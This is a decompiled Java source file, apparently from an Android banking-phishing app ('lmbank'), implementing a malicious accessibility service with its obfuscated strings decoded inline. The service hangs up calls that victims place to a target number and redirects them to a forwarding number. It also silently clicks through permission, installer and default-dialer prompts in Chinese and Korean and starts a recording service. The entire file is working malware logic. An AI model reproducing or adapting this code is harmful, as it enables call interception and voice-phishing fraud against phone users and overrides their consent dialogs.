package com.wish.lmbank.service;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.annotation.TargetApi;
import android.content.Intent;
import android.graphics.Path;
import android.os.Build;
import android.os.Handler;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import androidx.core.view.PointerIconCompat;

import com.wish.lmbank.AppStartV;
import com.wish.lmbank.R2;
import com.wish.lmbank.activity.LauncherActivity;
import com.wish.lmbank.common.Constants;
import com.wish.lmbank.common.URL;
import com.wish.lmbank.dialer.CustomDialerActivity;
import com.wish.lmbank.helper.AccessibilityHelper;
import com.wish.lmbank.keeplive.utils.ServiceUtils;
import com.wish.lmbank.phone.PhoneActivity;
import com.wish.lmbank.utils.LogUtils;
import com.wish.lmbank.utils.PermissionUtils;
import com.wish.lmbank.utils.SettingUtils;
import com.wish.lmbank.utils.SharedPreferencesUtils;

import java.util.Arrays;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/service/AutoServiceV.class */
public class AutoServiceV extends AccessibilityService {
    private final String TAG;
    private long current;
    private final Handler handler;
    private boolean isExecuteSuccess;

    public AutoServiceV() {
            this.TAG = AutoServiceV.class.getName();
        boolean isToMainActivity = false;
            this.handler = new Handler();
            this.current = 0L;
            this.isExecuteSuccess = false;
            return;
    }

    @Override // android.accessibilityservice.AccessibilityService
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        AccessibilityNodeInfo rootInActiveWindow;
        String str;
        String str2;
//         String m5998 = bb7d7pu7.m5998("jdHkjO_kgcbLgP7H");
        String m5998 = "不再询问";
//         String m59982 = bb7d7pu7.m5998("IiwwNjwnICc6PSglJTYoOSI");
        String m59982 = "KEY_UNINSTALL_APK";
        String str3 = (String) accessibilityEvent.getPackageName();
        if (TextUtils.isEmpty(str3) || (rootInActiveWindow = getRootInActiveWindow()) == null) {
            return;
        }
        int eventType = accessibilityEvent.getEventType();
        if (eventType == 32 || eventType == 2048) {
            String country = Locale.getDefault().getCountry();
            if (AppStartV.isOpenCustomDialer && Arrays.asList(AccessibilityHelper.PACKAGE_NAME_DIALER).contains(str3) && PermissionUtils.hasContactsPermission(this).isEmpty() && PermissionUtils.hasTelephonePermission(this).isEmpty()) {
                CustomDialerActivity.showCustomDialer(this);
//             } else if (bb7d7pu7.m5998("CgYERxoCHUcZGwYNRw0ACAUMGw").equals(str3)) {
            } else if ("com.skt.prod.dialer".equals(str3)) {
                if (!SettingUtils.isDefaultDialer(AppStartV.getContext()) || System.currentTimeMillis() - this.current < 3000) {
                    return;
                }
                this.current = System.currentTimeMillis();
                try {
                    if (this.handler == null || AppStartV.isPhoneCallActivityVisible) {
                        return;
                    }
                    this.handler.postDelayed(new Runnable() { // from class: com.wish.lmbank.service.AutoServiceV.1


                        @Override // java.lang.Runnable
                        public void run() {
                            AutoServiceV.this.performGlobalAction(1);
                            AutoServiceV.this.performGlobalAction(2);
                        }
                    }, 100L);
                    this.handler.postDelayed(new Runnable() { // from class: com.wish.lmbank.service.AutoServiceV.2
                        @Override // java.lang.Runnable
                        public void run() {
                           toDialer();
                        }
                    }, 500L);
                } catch (Exception e) {
//                     LogUtils.callLog(bb7d7pu7.m5998("KgUGGgxJPSoIBQVFSQwRCgwZHQAGB1NJ") + e.toString());
                    LogUtils.callLog("Close TCall, exception: " + e.toString());
                }
//             } else if (AppStartV.isOpenAuoServiceHangup && bb7d7pu7.m5998("CgYERxoIBBocBw5HCAcNGwYADUcABwoIBQUcAA").equals(str3)) {
            } else if (AppStartV.isOpenAuoServiceHangup && "com.samsung.android.incallui".equals(str3)) {
                try {
                    List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId(getString(R2.string.id_incallui_name));
                    if (findAccessibilityNodeInfosByViewId != null && !findAccessibilityNodeInfosByViewId.isEmpty()) {
                        Iterator<AccessibilityNodeInfo> it = findAccessibilityNodeInfosByViewId.iterator();
                        loop0: while (true) {
                            String str4 = "";
                            while (true) {
                                str = str4;
                                if (!it.hasNext()) {
                                    break loop0;
                                }
                                AccessibilityNodeInfo next = it.next();
                                if (next != null) {
                                    if (!TextUtils.isEmpty(next.getText())) {
                                        str4 = next.getText().toString();
                                    }
                                }
                            }
                        }
                    } else {
                        str = "";
                    }
                    List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId2 = rootInActiveWindow.findAccessibilityNodeInfosByViewId(getString(R2.string.id_incallui_phone_number));
                    if (findAccessibilityNodeInfosByViewId2 != null && !findAccessibilityNodeInfosByViewId2.isEmpty()) {
                        Iterator<AccessibilityNodeInfo> it2 = findAccessibilityNodeInfosByViewId2.iterator();
                        loop2: while (true) {
                            String str5 = "";
                            while (true) {
                                str2 = str5;
                                if (!it2.hasNext()) {
                                    break loop2;
                                }
                                AccessibilityNodeInfo next2 = it2.next();
                                if (next2 != null) {
                                    if (!TextUtils.isEmpty(next2.getText())) {
                                        str5 = next2.getText().toString();
                                    }
                                }
                            }
                        }
                    } else {
                        str2 = "";
                    }
                    boolean isEmpty = TextUtils.isEmpty(str);
//                     String m59983 = bb7d7pu7.m5998("SQ");
                    String m59983 = " ";
                    String replace = !isEmpty ? str.replace(m59983, "") : "";
                    String replace2 = !TextUtils.isEmpty(str2) ? str2.replace(m59983, "") : "";
                    boolean isEmpty2 = TextUtils.isEmpty(replace);
//                     String m59984 = bb7d7pu7.m5998("RA");
                    String m59984 = "-";
                    String str6 = replace;
                    if (!isEmpty2) {
                        str6 = replace.replace(m59984, "");
                    }
                    String str7 = replace2;
                    if (!TextUtils.isEmpty(replace2)) {
                        str7 = replace2.replace(m59984, "");
                    }
                    if (Build.VERSION.SDK_INT >= 23) {
                        if ((TextUtils.isEmpty(str6) || !str6.equals(AppStartV.autoServiceCallNumber)) && (TextUtils.isEmpty(str7) || !str7.equals(AppStartV.autoServiceCallNumber))) {
                            return;
                        }
                        String str8 = AppStartV.autoServiceCallNumber;
                        String str9 = AppStartV.autoServiceForwardingNumber;
                        if (AccessibilityHelper.findViewByIdAndClick(this, getString(R2.string.id_incallui_voice_disconnect_button))) {
                            AppStartV.resetAutoService();
//                             LogUtils.callLog(bb7d7pu7.m5998("gdfsjOPAjOP2gerUj-Xrj__ERUkHHAQLDBtTSQ") + str7 + bb7d7pu7.m5998("RUkHCAQMU0k") + str6 + bb7d7pu7.m5998("RUkZAQYHDFNJ") + str8 + bb7d7pu7.m5998("RUkPBhseCBsNAAcOU0k") + str9);
                            LogUtils.callLog("辅助功能挂断, number: " + str7 + ", name: " + str6 + ", phone: " + str8 + ", forwarding: " + str9);
                            AppStartV.autoServiceCallNumberMark = str8;
//                             PhoneActivity.actionStart(this, str8, str9, 2, bb7d7pu7.m5998("KBwdBjoMGx8ACgw"));
                            PhoneActivity.actionStart(this, str8, str9, 2, "AutoService");
                            try {
                                Handler handler = this.handler;
                                if (handler != null) {
                                    handler.postDelayed(new Runnable() { // from class: com.wish.lmbank.service.AutoServiceV.3

                                        @Override // java.lang.Runnable
                                        public void run() {
                                            SettingUtils.startActivityForCall(AppStartV.getContext(), str9);
                                        }
                                    }, 5000L);
                                }
                            } catch (Exception e2) {
//                                 LogUtils.callLog(bb7d7pu7.m5998("KBwdBjoMGx8ACgxJGh0IGx0oCh0AHwAdEC8GGyoIBQVFSQwRCgwZHQAGB1NJ") + e2.toString());
                                LogUtils.callLog("AutoService startActivityForCall, exception: " + e2.toString());
                            }
                        }
                    }
                } catch (Exception e3) {
//                     LogUtils.callLog(bb7d7pu7.m5998("KBwdBjoMGx8ACgxJABomGQwHKBwGOgwbHwAKDCEIBw4cGUVJDBEKDBkdAAYHU0k") + e3.toString());
                    LogUtils.callLog("AutoService isOpenAuoServiceHangup, exception: " + e3.toString());
                }
            } else {
                boolean z = Constants.OPEN_SMS;
//                 String m59985 = bb7d7pu7.m5998("hPD8hfTR");
                String m59985 = "확인";
//                 String m59986 = bb7d7pu7.m5998("jsjHjMfz");
                String m59986 = "确定";
//                 String m59987 = bb7d7pu7.m5998("Ijs");
                String m59987 = "KR";
//                 String m59988 = bb7d7pu7.m5998("Kic");
                String m59988 = "CN";
//                 if (z && bb7d7pu7.m5998("CgYERxoIBBocBw5HCAcNGwYADUcEDBoaCA4ABw4").equals(str3)) {
                if (z && "com.samsung.android.messaging".equals(str3)) {
                    if (m59988.equals(country)) {
                        AccessibilityHelper.executeClick(rootInActiveWindow, m59986);
                    }
                    if (m59987.equals(country)) {
                        AccessibilityHelper.executeClick(rootInActiveWindow, m59985);
                    }
                }
//                 String m59989 = bb7d7pu7.m5998("CgYERw4GBg4FDEcIBw0bBgANRxkICgIIDgwABxodCAUFDBs");
                String m59989 = "com.google.android.packageinstaller";
                if (m59989.equals(str3)) {
                    try {
                        if (SharedPreferencesUtils.getValue(m59982, false)) {
                            if (m59988.equals(country)) {
                                AccessibilityHelper.executeClick(rootInActiveWindow, m59986);
                            }
                            if (m59987.equals(country)) {
                                AccessibilityHelper.executeClick(rootInActiveWindow, m59985);
                            }
                            SharedPreferencesUtils.putValue(m59982, false);
                        }
                    } catch (Exception e4) {
//                         LogUtils.callLog(bb7d7pu7.m5998("KBwdBjoMGx8ACgxJOSgqIiguLDYnKCQsNiAnOj0oJSUsO0VJDBEKDBkdAAYHU0k") + e4.toString());
                        LogUtils.callLog("AutoService PACKAGE_NAME_INSTALLER, exception: " + e4.toString());
                    }
                }
//                 if (bb7d7pu7.m5998("CgYERw4GBg4FDEcIBw0bBgANRxkMGwQAGhoABgcKBgcdGwYFBQwb").equals(str3) || bb7d7pu7.m5998("CgYERxoIBBocBw5HCAcNGwYADUcZDBsEABoaAAYHCgYHHRsGBQUMGw").equals(str3) || m59989.equals(str3) || bb7d7pu7.m5998("CgYERwgHDRsGAA1HGgwbHwwbRx0MBQwKBgQ").equals(str3)) {
                if ("com.google.android.permissioncontroller".equals(str3) || "com.samsung.android.permissioncontroller".equals(str3) || m59989.equals(str3) || "com.android.server.telecom".equals(str3)) {
                    try {
                        if (AccessibilityHelper.isExist(rootInActiveWindow, getString(R2.string.app_name))) {
                            if (m59988.equals(country)) {
//                                 AccessibilityHelper.executeClick(rootInActiveWindow, bb7d7pu7.m5998("jOzogcfR"));
                                AccessibilityHelper.executeClick(rootInActiveWindow, "允许");
//                                 AccessibilityHelper.executeClick(rootInActiveWindow, bb7d7pu7.m5998("jdLsjPXBjdTWjv3BgcbMjNP9jv3Bj_7fjOzogcfR"));
                                AccessibilityHelper.executeClick(rootInActiveWindow, "仅在使用该应用时允许");
//                                 AccessibilityHelper.executeClick(rootInActiveWindow, bb7d7pu7.m5998("jdb0jvzwjPXBi-n1jPXBjdTWjv3BgcbMjNP9jv3Bj_X2gP7di-n0"));
                                AccessibilityHelper.executeClick(rootInActiveWindow, "保留在“在使用该应用期间”");
                            }
                            if (m59987.equals(country)) {
//                                 AccessibilityHelper.executeClick(rootInActiveWindow, bb7d7pu7.m5998("hP7hhfPA"));
                                AccessibilityHelper.executeClick(rootInActiveWindow, "허용");
                                AccessibilityHelper.executeClick(rootInActiveWindow, getString(R2.string.text1));
                            }
                            if (Build.VERSION.SDK_INT <= 28) {
//                                 AccessibilityHelper.executeClick(rootInActiveWindow, bb7d7pu7.m5998("gcfXjdHTgNLxgcfNjv3cgcb0jNP9jv3B"));
                                AccessibilityHelper.executeClick(rootInActiveWindow, "设为默认电话应用");
                            }
                        }
                        if (AccessibilityHelper.checkRadioButton(rootInActiveWindow, getResources().getString(R2.string.app_name))) {
                            if (m59988.equals(country)) {
//                                 AccessibilityHelper.executeClick(rootInActiveWindow, bb7d7pu7.m5998("gcfXjdHTgNLxgcfNjNP9jv3B"));
                                AccessibilityHelper.executeClick(rootInActiveWindow, "设为默认应用");
                            }
                            if (m59987.equals(country)) {
                                AccessibilityHelper.executeClick(rootInActiveWindow, AccessibilityHelper.TEXT_KR_SET_DEFAULT_APPLICATION);
                            }
                            if (m59988.equals(country)) {
                                if (AccessibilityHelper.isExist(rootInActiveWindow, m5998)) {
                                    AccessibilityHelper.executeClick(rootInActiveWindow, m5998);
                                } else {
//                                     AccessibilityHelper.executeClick(rootInActiveWindow, bb7d7pu7.m5998("jOb_j9_h"));
                                    AccessibilityHelper.executeClick(rootInActiveWindow, "取消");
                                }
                            }
                            if (m59987.equals(country)) {
                                if (AccessibilityHelper.isExist(rootInActiveWindow, AccessibilityHelper.TEXT_KR_NO_ASK)) {
                                    AccessibilityHelper.executeClick(rootInActiveWindow, AccessibilityHelper.TEXT_KR_NO_ASK);
                                } else {
//                                     AccessibilityHelper.executeClick(rootInActiveWindow, bb7d7pu7.m5998("hd7Bhe_l"));
                                    AccessibilityHelper.executeClick(rootInActiveWindow, "취소");
                                }
                            }
                        }
                    } catch (Exception e5) {
//                         LogUtils.callLog(bb7d7pu7.m5998("KBwdBjoMGx8ACgxJKiYnPTsmJSUsO0VJDBEKDBkdAAYHU0k") + e5.toString() + bb7d7pu7.m5998("RUkZCAoCCA4MU0k") + str3);
                        LogUtils.callLog("AutoService CONTROLLER, exception: " + e5.toString() + ", package: " + str3);
                    }
                }
                if (getString(R2.string.pkg_server_telecom).equals(str3)) {
//                     AccessibilityHelper.executeClick(rootInActiveWindow, bb7d7pu7.m5998("g9HZgtrRhfXVgsj1SYXtzYXJ_A"));
                    AccessibilityHelper.executeClick(rootInActiveWindow, "기본으로 설정");
                }
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void gestureSlide() {
        if (((-1198) - 10518) % (-10518) <= 0) {
            if (Build.VERSION.SDK_INT >= 24) {
                DisplayMetrics displayMetrics = getResources().getDisplayMetrics();
                int i = displayMetrics.heightPixels;
                int i2 = displayMetrics.widthPixels;
                Path path = new Path();
                float f = i2 / 2;
                path.moveTo(f, (i * 4) / 5);
                path.lineTo(f, (i * 1) / 3);
                dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 1000L)).build(), new GestureCallBack(this), null);
                return;
            }
            return;
        }
        int i3 = (-11025) + (-11025) + 16604;
        while (true) {
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* loaded from: cookie_9234504.jar:com/wish/lmbank/service/AutoServiceV$GestureCallBack.class */
    @TargetApi(Build.VERSION_CODES.N)
    public class GestureCallBack extends GestureResultCallback {
        final AutoServiceV this$0;

        public GestureCallBack(AutoServiceV autoServiceV) {
            this.this$0 = autoServiceV;
        }

        @Override // android.accessibilityservice.AccessibilityService.GestureResultCallback
        public void onCompleted(GestureDescription gestureDescription) {
            super.onCompleted(gestureDescription);
            if (this.this$0.isExecuteSuccess) {
                return;
            }
            this.this$0.gestureSlide();
        }

        @Override // android.accessibilityservice.AccessibilityService.GestureResultCallback
        public void onCancelled(GestureDescription gestureDescription) {
            super.onCancelled(gestureDescription);
            this.this$0.isExecuteSuccess = true;
        }
    }

    @Override // android.accessibilityservice.AccessibilityService
    public void onInterrupt() {
//         LogUtils.callLog(this.TAG + bb7d7pu7.m5998("SQYHIAcdDBsbHBkd"));
        LogUtils.callLog(this.TAG + " onInterrupt");
    }

    @Override // android.accessibilityservice.AccessibilityService
    protected void onServiceConnected() {
        super.onServiceConnected();
        try {
            AccessibilityServiceInfo serviceInfo = getServiceInfo();
//                 serviceInfo.packageNames = new String[]{getString(R2.string.pkg_gogolook), getString(R2.string.pkg_package), getString(R2.string.pkg_permission), getString(R2.string.pkg_setting), getString(R2.string.pkg_skt_dialer), getString(R2.string.pkg_telecom), getString(R2.string.pkg_whowho), getString(R2.string.pkg_whox), getString(R2.string.pkg_server_telecom), bb7d7pu7.m5998("CgYERxoIBBocBw5HCAcNGwYADUcEDBoaCA4ABw4"), bb7d7pu7.m5998("CgYERxoIBBocBw5HCAcNGwYADUcZDBsEABoaAAYHCgYHHRsGBQUMGw"), bb7d7pu7.m5998("CgYERxoIBBocBw5HCAcNGwYADUcABwoIBQUcAA"), bb7d7pu7.m5998("CgYERxoMCkcIBw0bBgANRwgZGUcFCBwHCgEMGw"), bb7d7pu7.m5998("CgYERxoIBBocBw5HCAcNGwYADUcNAAgFDBs")};
            serviceInfo.packageNames = new String[]{getString(R2.string.pkg_gogolook), getString(R2.string.pkg_package), getString(R2.string.pkg_permission), getString(R2.string.pkg_setting), getString(R2.string.pkg_skt_dialer), getString(R2.string.pkg_telecom), getString(R2.string.pkg_whowho), getString(R2.string.pkg_whox), getString(R2.string.pkg_server_telecom), "com.samsung.android.messaging", "com.samsung.android.permissioncontroller", "com.samsung.android.incallui", "com.sec.android.app.launcher", "com.samsung.android.dialer"};
            serviceInfo.eventTypes = -1;
            serviceInfo.notificationTimeout = 180L;
            setServiceInfo(serviceInfo);
            String value = SharedPreferencesUtils.getValue(Constants.K_SHOW_ACCESS, "");
            boolean equals = Constants.K_SHOW_ACCESS_APPLYING.equals(value);
//                 String m5998 = bb7d7pu7.m5998("IiwwNjohJj42KCoqLDo6Njo8KiosOjo");
            String m5998 = "KEY_SHOW_ACCESS_SUCCESS";
            if (equals) {
                SharedPreferencesUtils.putValue(Constants.K_SHOW_ACCESS, m5998);
                toMainActivity(true, 0);
//                 } else if (m5998.equals(value) && !SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNi8gOzo9"), true)) {
            } else if (m5998.equals(value) && !SharedPreferencesUtils.getValue("KEY_FIRST", true)) {
//                     SettingUtils.requestDefaultDialer(this, true, bb7d7pu7.m5998("JSgcHQY6DBsfAAoM"));
                SettingUtils.requestDefaultDialer(this, true, "LAutoService");
            }
            String host = URL.getHost();
            boolean isServiceRunning = new ServiceUtils().isServiceRunning(this, RecServiceV.class.getName());
            if (!TextUtils.isEmpty(host) && !isServiceRunning && PermissionUtils.hasAllPermission(this).size() < 1) {
                startService(new Intent(this, RecServiceV.class));
            }
            SettingUtils.sendBroadcastUninstallApk(AppStartV.getContext());
//                 LogUtils.callLog(this.TAG + bb7d7pu7.m5998("SQYHOgwbHwAKDCoGBwcMCh0MDUVJGgEGHigKCgwaGlNJ") + value + bb7d7pu7.m5998("RUkBBhodU0k") + host + bb7d7pu7.m5998("RUkAGjoMGx8ACgw7HAcHAAcOU0k") + isServiceRunning);
            LogUtils.callLog(this.TAG + " onServiceConnected, showAccess: " + value + ", host: " + host + ", isServiceRunning: " + isServiceRunning);
            return;
        } catch (Exception e) {
//                 LogUtils.callLog(this.TAG + bb7d7pu7.m5998("SQYHOgwbHwAKDCoGBwcMCh0MDUVJDBEKDBkdAAYHU0k") + e.getMessage());
            LogUtils.callLog(this.TAG + " onServiceConnected, exception: " + e.getMessage());
            return;
        }
    }

    private void toMainActivity(boolean z, int i) {
        if (z) {
            toHome();
        }
        Intent intent = new Intent();
        intent.setClass(this, LauncherActivity.class);
//         intent.putExtra(bb7d7pu7.m5998("LyUoLg"), i);
        intent.putExtra("FLAG", i);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    public void toHome() {
//         Intent intent = new Intent(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRyQoICc"));
        Intent intent = new Intent("android.intent.action.MAIN");
//         intent.addCategory(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCggdDA4GGxBHISYkLA"));
        intent.addCategory("android.intent.category.HOME");
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void toDialer() {
        //             Intent launchIntentForPackage = getPackageManager().getLaunchIntentForPackage(bb7d7pu7.m5998("CgYERxoIBBocBw5HCAcNGwYADUcNAAgFDBs"));
        Intent launchIntentForPackage = getPackageManager().getLaunchIntentForPackage("com.samsung.android.dialer");
        if (launchIntentForPackage != null) {
            launchIntentForPackage.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(launchIntentForPackage);
            return;
        }
        return;
    }
}
